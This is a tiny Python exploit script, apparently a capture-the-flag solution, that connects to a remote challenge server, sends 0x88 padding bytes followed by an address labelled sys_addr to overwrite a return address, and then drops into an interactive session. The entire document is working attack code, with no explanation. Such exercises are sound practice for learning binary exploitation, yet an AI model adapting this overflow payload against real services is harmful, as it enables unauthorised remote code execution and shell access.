#!/usr/bin/env python
from zio import *
sys_addr = 0x0000000000400596
io = zio(('pwn2.jarvisoj.com',9881))
io.write('a'*0x88 + l64(sys_addr))
io.interact()
